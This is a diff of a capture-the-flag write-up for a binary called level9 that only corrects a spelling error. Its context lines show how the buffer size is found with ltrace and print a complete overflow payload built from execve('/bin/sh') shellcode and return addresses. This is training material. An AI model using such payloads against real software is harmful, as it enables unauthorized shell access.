@@ -13,7 +13,7 @@ the exploit will look like this:
 
 running `ltrace ./level9 iiii` we can see the call to memcpy, and the dest address; `0x0804a00c`.
 the difference between the memcpy call and the previous call gives us the size of the buffer; `0x804a078` - `0x0804a00c` = 108.
-using the same shellcode as level2, which is 25 long, + 4 byte for the addres, we must add 79 of filling.
+using the same shellcode as level2, which is 25 long, + 4 byte for the address, we must add 79 of filling.
 
 `\x0c\xa0\x04\x08 + \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80 + i*79 + \x0c\xa0\x04\x08`
 
